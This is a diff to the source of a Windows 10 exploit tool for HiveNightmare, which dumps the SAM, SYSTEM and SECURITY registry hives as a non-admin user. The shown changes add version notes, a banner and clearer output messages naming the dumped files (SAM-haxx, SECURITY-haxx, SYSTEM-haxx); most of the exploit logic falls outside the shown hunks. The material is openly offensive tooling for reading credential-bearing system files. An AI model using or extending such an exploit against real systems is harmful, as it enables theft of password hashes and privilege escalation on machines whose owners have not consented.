@@ -1,9 +1,10 @@
 // Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
-// Allows you to read SAM data (sensitive) in Windows 10
+// Allows you to read SAM, SYSTEM and SECURITY registry hives in Windows 10 from non-admin users
 
 // History
 // 0.1 - 20/07/2021 - Initial version
 // 0.2 - 20/07/2021 - Adds support for 4 snapshots
+// 0.3 - 20/07/2021 - merge in support for SYSTEM and SECURITY dumping, various bug fixes
 // 
 // Bugs and issues
 // - Dunno
@@ -17,6 +18,8 @@ using std::cout;
 
 void main()
 {
+    printf("\nHiveNightmare - dump registry hives as non-admin users\n\nRunning...\n\n");
+
     HANDLE hFile;
     HANDLE hAppend;
     DWORD  dwBytesRead, dwBytesWritten, dwPos;
@@ -161,7 +164,7 @@ void main()
 
     if (hAppend == INVALID_HANDLE_VALUE)
     {
-        printf("Could not write SYSTEM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to");
+        printf("Could not write SYSTEM-haxx - permission issue rather than vulnerability issue, make sure you're running from a folder where you can write to\n");
         return;
     }
 
@@ -185,5 +188,5 @@ void main()
 
     cout << "SYSTEM hive written out to current working directory" << endl;
 
-    cout << "Assuming no errors, should be able to find hive dump files in current working directory" << endl;
+    cout << "Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, SECURITY-haxx and SYSTEM-haxx" << endl;
 }
